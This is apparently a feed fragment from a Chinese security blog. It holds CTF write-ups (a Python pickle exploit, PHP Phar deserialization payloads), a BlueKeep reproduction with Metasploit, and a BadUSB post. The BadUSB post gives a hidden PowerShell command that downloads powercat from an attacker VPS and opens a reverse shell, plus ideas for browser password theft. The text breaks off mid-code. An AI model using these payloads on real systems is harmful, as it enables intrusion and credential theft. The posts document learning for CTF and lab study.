        <tags>
            
            <tag> python反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华北赛区 Day1 Web2 ikun</title>
      <link href="/2019/09/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/"/>
      <url>/2019/09/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="CISCN2019-华北赛区-Day1-Web2-ikun"></a>CISCN2019-华北赛区-Day1-Web2-ikun</h1><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><ul><li><p>首先注册账号，对于这种框架下的登陆框，压根没敢想过会有什么SQL注入。</p></li><li><p>在页面中发现hint：需要购买lv6，但是翻了好几页都没有找到lv6，于是用python脚本来处理</p><p><img src="CISCN2019-华北赛区-Day1-Web2-ikun/1.png" alt=""></p><p>发现在181页可以购买lv6，但是价格太高无法购买</p></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="薅羊毛逻辑漏洞"><a href="#薅羊毛逻辑漏洞" class="headerlink" title="薅羊毛逻辑漏洞"></a>薅羊毛逻辑漏洞</h3><p><img src="CISCN2019-华北赛区-Day1-Web2-ikun/4.png" alt=""></p><p>在页面中发现post表单，里面有对价格和折扣的定义。竟然前端处理，可以直接更改（也可以抓包后更改重放）。将折扣改成0.00000000000008，便可以低价购买到lv6</p><p><strong>注意：这里不能直接将价格/折扣改成0，此处的逻辑漏洞应该有对0进行过滤，只能改成一个无限小的数来进行利用</strong></p><h3 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h3><p>​        购买lv6后，转跳至一个隐藏路由，显示需要admin才能访问。</p><p>​        抓包发现有JWT，想到jwt伪造</p><ul><li><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">JWT-Crack</a>进行爆破破解，发现Secret</p><p><img src="CISCN2019-华北赛区-Day1-Web2-ikun/2.png" alt=""></p></li></ul><ul><li><p><a href="https://jwt.io/" target="_blank" rel="noopener">JWT伪造</a></p><p><img src="CISCN2019-华北赛区-Day1-Web2-ikun/7.png" alt=""></p></li></ul><p>将伪造的JWT替换后成功以admin登录，并在源码中发现www.zip</p><p><img src="CISCN2019-华北赛区-Day1-Web2-ikun/5.png" alt=""></p><h3 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h3><p>​        在Admin.py中存在反序列化漏洞。这里涉及到一个库pickle，上网查了一下python反序列化，提到较多的就是这个pickle（还有YAML）</p><p><img src="CISCN2019-华北赛区-Day1-Web2-ikun/8.png" alt=""></p><p>这里的Tonado框架中self.get_argument函数获取POST/GET来的become参数，并执行了pickle.loads()函数。这里就存在反序列化漏洞。</p><p>（初次接触到pickle反序列化，后续补篇博客详解一下原理）</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p>将结果替换become参数的值，得到flag回显</p><p><img src="CISCN2019-华北赛区-Day1-Web2-ikun/5.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT伪造 </tag>
            
            <tag> python反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Badusb初探</title>
      <link href="/2019/09/16/Badusb%E5%88%9D%E6%8E%A2/"/>
      <url>/2019/09/16/Badusb%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Badusb初探"><a href="#Badusb初探" class="headerlink" title="Badusb初探"></a>Badusb初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        从贵阳英才集训中，偶然接触到大师傅介绍的一种社工手段，badusb，不同于以前的那种U盘里带病毒，严格来说badusb不算是U盘，它也不提供存储功能。但是正因为它将恶意代码置于硬件中，使得杀软以及格式化等防范措施都无效。</p><p>​        赵春师傅的badusb，自带了wifi模块，对于物理隔离的内网也能在插入badusb后建立网络与外界连通，这也是一种有效的打击隔离内网的社工方法。</p><p>​        回去以后好奇买了一个玩玩，没有wifi模块，需要主机自带网络才能执行反弹shell等恶意操作。</p><p>​        之前学长推的一个项目Chrome-Password-Dumper，其中利用了powershell脚本中的IEX (New-Object System.Net.Webclient).DownloadString()，真觉得它的功能强大（完美地贴合渗透..），正好可以利用于badusb中远程执行恶意脚本。</p><h2 id="badusb介绍"><a href="#badusb介绍" class="headerlink" title="badusb介绍"></a>badusb介绍</h2><p>​        BadUSB是利用伪造HID设备执行攻击载荷的一种攻击方式。HID设备通常指的就是键盘鼠标等与人交互的设备，用户插入BadUSB，就会自动执行预置在固件中的恶意代码。</p><p>​        Bad-Usb插入后，会模拟键盘鼠标对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载其他代码并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</p><h2 id="获取途径"><a href="#获取途径" class="headerlink" title="获取途径"></a>获取途径</h2><p><img src="Badusb初探/1.png" alt=""></p><h2 id="安装Arduino-IDE"><a href="#安装Arduino-IDE" class="headerlink" title="安装Arduino IDE"></a>安装Arduino IDE</h2><p><img src="Badusb初探/2.png" alt=""></p><h2 id="写入代码"><a href="#写入代码" class="headerlink" title="写入代码"></a>写入代码</h2><p><img src="Badusb初探/3.png" alt=""></p><p>工具 →获取开发板信息</p><p><img src="Badusb初探/4.png" alt=""></p><p>在工具下选好开发板（上图的ArduinoLeonardo）和端口，编程器选择USBasp</p><p><img src="Badusb初探/5.png" alt=""></p><p>然后 编译 上传 即可</p><p><img src="Badusb初探/6.png" alt=""></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul><li>反弹shell<ul><li>利用powershell，将恶意脚本挂载置vps，badusb写入反弹shell代码</li></ul></li></ul><p><code>POWERSHELL -WindowStyle hidden -ExecutionPolicy Bypass IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://your_vps_ip/xxx/powercat.ps1&#39;); POWERCAT -c your_vps_ip -p 9999 -e cmd</code></p><p><strong>PS：遇到UAC（用户访问控制）这种，键盘模拟也可以绕过（说是绕过，其实就是操作键盘按键来选择赋权），比如CMD的管理员模式，可以win+r打开运行后，输入cmd，再按住Shift+Ctrl+回车即可以管理员启动cmd，同时控制好延时时间，对弹出来的UAC，按住Alt即可出现Y/N对“是/否”的选择。或者直接操作左键+回车都可以选择到“是”来打开管理员cmd</strong></p><ul><li>结合Chrome-Password-Dumper，窃取chorme保存用户数据并传给远程服务器<ul><li>简单实现：chorme.ps 挂载vps，服务器监听端口</li><li>（也可以采用FTP，加密等手段完善项目，后续有时间再看吧..）</li><li>后续发现有本地直接执行的python代码，转成了exe也可以实现窃密。这样就不能写入badusb，而是需要靠伪装exe通过社交平台传播。优点：不需要远程下载脚本执行，速度极快</li></ul></li></ul><ul><li><p>Powershell-Mimikatz</p><p>同上利用方式，badusb中恶意代码远程下载Mimikatz脚本执行，适当修改其脚本添加转发功能即可实现远程dump-password。</p></li></ul><ul><li><p>其他</p><p>永久后门、当前用户修改密码、键盘记录、强制关机、添加隐藏用户、盗取wifi密码等等。由于powershell能够做的事太多了，所以基本上能想象的攻击操作都能够通过这种方式实现。</p></li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul><li>Powershell脚本的强大， 能很好地用于渗透，不乏像【nishang】、【empire】这样的powershell框架，所以学好它，会利用好它很有必要。后续补一下powershell学习笔记。</li><li>powershell绕过UAC</li></ul><p><a href="http://blog.vichamp.com/2013/09/09/index/" target="_blank" rel="noopener">PowerShell 技能连载 - 汇总索引</a></p>]]></content>
      
      
      <categories>
          
          <category> 社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化利用总结</title>
      <link href="/2019/09/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2019/09/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化利用总结"><a href="#PHP反序列化利用总结" class="headerlink" title="PHP反序列化利用总结"></a>PHP反序列化利用总结</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>​        来自PHP官方文档的解释，所有php里面的值都可以使用函数<a href="https://www.php.net/manual/zh/function.serialize.php" target="_blank" rel="noopener">serialize()</a>来返回一个包含字节流的字符串来表示。<a href="https://www.php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize()</a>函数能够重新把字符串变回php原来的值。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>​        PHP 将所有以<em>\</em>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以__ 为前缀。</p><p>详细参考<a href="https://secure.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">官方文档</a></p><p><img src="PHP反序列化利用总结/1.png" alt=""></p><h2 id="序列化结构分析"><a href="#序列化结构分析" class="headerlink" title="序列化结构分析"></a>序列化结构分析</h2><p><strong>1、含义</strong></p><p>eg：<code>O:4:&quot;user&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:7:&quot;coco1er&quot;;}</code></p><p>O代表对象；4代表对象名长度；2代表2个成员变量；</p><p>其他结构参照：</p><div class="table-container"><table><thead><tr><th>类型</th><th>结构</th></tr></thead><tbody><tr><td>String</td><td>s:size:value;</td></tr><tr><td>Integer</td><td>i:value;</td></tr><tr><td>Boolean</td><td>b:value;(保存1或0)</td></tr><tr><td>Array</td><td>a:size:{key definition;value definition;(repeated per element)}</td></tr><tr><td>Null</td><td>N;</td></tr><tr><td>Object</td><td>O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td></tr></tbody></table></div><p><strong>2、结构实例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string(5) &quot;i:34;&quot;</span><br><span class="line">string(13) &quot;s:6:&quot;uusama&quot;;&quot;</span><br><span class="line">string(4) &quot;b:1;&quot;</span><br><span class="line">string(2) &quot;N;&quot;</span><br><span class="line">string(30) &quot;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&quot;</span><br><span class="line">string(52) &quot;O:2:&quot;CC&quot;:2:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:8:&quot; CC pass&quot;;b:1;&#125;&quot;</span><br></pre></td></tr></table></figure><p><strong>3、public . protect . private下序列化对象的区别</strong></p><ul><li><p><strong>public变量</strong></p><p><code>直接变量名反序列化出来</code></p></li><li><p><strong>private变量</strong></p><p><code>\x00 + 类名+ \x00 + 变量名</code></p></li><li><p><strong>protect变量</strong></p><p><code>\x00 + * + \x00 + 变量名</code></p></li></ul><h2 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h2><h3 id="wakeup失效"><a href="#wakeup失效" class="headerlink" title="__wakeup失效"></a><strong>__wakeup失效</strong></h3><p>当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行</p><p>适用版本：</p><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><p><em>参考CVE-2016-7124</em></p><h3 id="使用-绕过正则"><a href="#使用-绕过正则" class="headerlink" title="使用+绕过正则"></a><strong>使用<code>+</code>绕过正则</strong></h3><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var) O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;O:+4:&quot;Demo&quot;:1&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a><strong>Phar反序列化</strong></h3><p>​        PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和fielsize()的文件系统函数。</p><h4 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h4><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p><p><strong>phar文件有四部分构成：</strong></p><ol><li><p><strong>a stub</strong></p><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前期内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别其为phar文件。</p></li><li><p><strong>a manifest describing the contents</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都存放在这一部分中。这部分将会以序列化的形式存储用户自定义的meta-data。</p></li><li><p><strong>the file contents</strong></p><p>被压缩文件的内容</p></li><li><p><strong>[optional] a signature for verifying Phar integrity (phar file format only)</strong></p><p>签名，放在文件末尾，目前支持的两种签名格式是MD5和SHA1。</p></li></ol><h4 id="phar-利用点"><a href="#phar-利用点" class="headerlink" title="phar://利用点"></a><strong>phar://利用点</strong></h4><p>漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的meta-data会被反序列化。</p><p>meta-data是用serialize()生成并保存在phar文件中，当内核调用phar_parse_metadata()解析meta-data数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。</p><p>PS：php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; phar.readonly无法通过该语句进行设置: init_set(&quot;phar.readonly&quot;,0);</span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $test&#x3D;&quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(&quot;test.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;test.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $o &#x3D; new Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    $phar-&gt;stopBuffering();    &#x2F;&#x2F;签名自动计算</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_get_contents(&quot;phar:&#x2F;&#x2F;.&#x2F;test.phar&#x2F;test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PS：<strong>系统文件操作的函数【如 file_exists()，fopen()，file_get_contents()，file() 等文件操作的函数】一般都能使用伪协议流，Phar:// 也是ok的</strong></p><p><img src="PHP反序列化利用总结/2.png" alt=""></p><p>md5_file、filesize</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a><strong>拓展</strong></h4><p>​    <strong>Bzip / Gzip</strong></p><p>​    如果 phar://不能出现在头几个字符怎么办？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">demo.php?filename&#x3D;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload_file&#x2F;shell.gif&#x2F;a</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">demo.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;xxx</span><br></pre></td></tr></table></figure><p>   <strong>绕过文件上传</strong></p><p><code>$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</code></p><p><strong>file_un.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "cck";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p><strong>利用代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "cck";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p>将生成的phar.phar改为phar.gif成功绕过上传，然后利用 file_exists，使用 phar://执行代码</p><p><strong>Session反序列化</strong></p><p>这个目前还没有刷到利用该知识点的题，后续遇上了再补上。可以参考</p><p><a href="https://www.anquanke.com/post/id/159206#h2-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206#h2-10</a></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">PHP反序列化拓展操作总结</a></p><p><a href="https://www.cnblogs.com/Byqiyou/p/10187672.html" target="_blank" rel="noopener">Phar的一些利用姿势</a></p><p><a href="https://www.anquanke.com/post/id/159206#h2-10" target="_blank" rel="noopener">PHP反序列化利用的4个实例</a></p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">PHP反序列化攻击面</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0708复现</title>
      <link href="/2019/09/15/0708%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/09/15/0708%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-0708复现"><a href="#CVE-2019-0708复现" class="headerlink" title="CVE-2019-0708复现"></a>CVE-2019-0708复现</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>​        Windows再次被曝出一个破坏力巨大的高危远程漏洞CVE-2019-0708。攻击者一旦成功利用该漏洞，便可以在目标系统上执行任意代码，包括获取敏感信息、执行远程代码、发起拒绝服务攻击等等攻击行为。而更加严重的是，这个漏洞的触发无需用户交互，攻击者可以用该漏洞制作堪比2017年席卷全球的WannaCry类蠕虫病毒，从而进行大规模传播和破坏。2019年5月14日微软官方发布安全补丁，修复了该Windows远程桌面服务的远程代码执行漏洞。</p><p>​        目前,9月7日EXP代码已被公开发布至<code>metasploit-framework</code>的Pull requests中,经测试已经可以远程代码执行。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul><li>Windows 7</li><li>Windows server 2008 R2</li><li>Windows server 2008</li><li>Windows 2003</li><li>Windows xp</li></ul><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>本次复现采用的靶机：<strong>Win7 sp1 x64企业版</strong>（MSDN上直接下载镜像）</p><p>攻击机：<strong>kali 2019.01</strong></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1、 更新msf，复现要求msf5.0+</p><p><code>apt-get update</code></p><p><code>apt-get install metasploit-framework</code></p><p>或者：</p><p>一键更新安装msf（这个命令会重装msf，路径会更改成/opt/metasploit-framework/embedded/framework/，kali默认是在/usr下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; .&#x2F;msfinstall</span><br></pre></td></tr></table></figure><p>2、网上下载套件，或者直接使用msf官方给的4个.rb文件。将文件移至msf的相应目录下，如果有重名的直接覆盖即可</p><p>（用官方的没打进，不知道什么原因，网上找了一个修改过的攻击套件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb   -&gt;   &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;rdp.rb</span><br><span class="line">rdp_scanner.rb   -&gt;   &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb   -&gt;   &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb   -&gt;   &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><p>3、获取了套件后，使用<code>msfconsole</code>进入metasploit</p><p>​      进入以后运行<code>reload_all</code>重新加载0708rdp利用模块</p><p>​      <code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code> 利用模块</p><p>​      <code>show options</code>设置模块相应的参数如RHOSTS、RPORT、target等</p><p>​      本次复现攻击机ip：192.168.23.136</p><p>​      本次复现靶机ip：192.168.23.142</p><p>​      端口：3389</p><p>​      target：3</p><p><strong>参数设置</strong></p><p><img src="0708复现/Snipaste_2019-09-10_01-46-33.png" alt=""></p><p><strong>exploit/run</strong></p><p><img src="0708复现/Snipaste_2019-09-10_01-45-44.png" alt=""></p><p>在kali下shell中回显的中文出现乱码，参考网上解决方法如下：</p><p><strong>方案一</strong></p><p><img src="0708复现/Snipaste_2019-09-10_01-51-09.png" alt=""></p><p><strong>方案二</strong></p><p>shell终端里输入<code>chcp 65001</code></p><p>注意：</p><ul><li>这两个方案设置会随操作系统重启而失效</li><li>设定简体中文编码后，Linux中的中文字符就会乱码，因为linux使用UTF-8编码</li><li>建议只在需要的时候设定简体中文编码</li></ul><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><ul><li>网上复现大多复现的win7 旗舰版，自己复现一直打蓝屏，同样Windows server 2008 R2也打蓝屏，exp并不稳定，测的企业版还是比较稳定。</li></ul><p><img src="0708复现/Snipaste_2019-09-10_08-20-17.png" alt=""></p><ul><li>原本有个win7虚拟机，最初打不开3389端口，后来发现是Win7 家庭版，家庭版只支持远程协助，不支持远程桌面服务</li></ul><ul><li>只要exp没有报错，可能攻击一次不成功，多试几次。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016 0CTF—piapiapia</title>
      <link href="/2019/09/14/2016-0CTF%E2%80%94piapiapia/"/>
      <url>/2019/09/14/2016-0CTF%E2%80%94piapiapia/</url>
      
        <content type="html"><![CDATA[<h1 id="2016-0CTF—piapiapia"><a href="#2016-0CTF—piapiapia" class="headerlink" title="2016 0CTF—piapiapia"></a>2016 0CTF—piapiapia</h1><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><ul><li>典型的登录界面，F12没有发现信息</li><li>御剑扫、源码泄露扫无果（由于后台路由的匹配问题，导致很多路径都返回的200）</li><li>弱口令爆破admin无果</li><li>登录界面猜测是否有register，发现/register.php</li><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>扫出了源码www.zip</li></ul><p><img src="2016-0CTF—piapiapia/2.png" alt=""></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>php代码审计，先拿Seay审计一下看下大概会有什么漏洞</p><p><img src="2016-0CTF—piapiapia/3.png" alt=""></p><p>对于1、2两个点，提到的都是一个问题，应该不会有漏洞，后续看了代码也发现在调用sql语句时进行了filter函数的过滤</p><p>对于4这个点，上传后文件名被md5也就无法解析成php，也不存在文件上传漏洞。</p><p>这下只剩下3这个点，我们可以看到这个敏感函数file_get_contents($profile[‘photo’])，那么能不能通过控制photo来控制文件内容把flag读出来呢？</p><p>又发现在config.php中有flag的标识</p><p><img src="2016-0CTF—piapiapia/4.png" alt=""></p><p>那么基本可以确定思路就是想方设法来控制photo从而读出config.php的内容</p><p>部分源码：</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 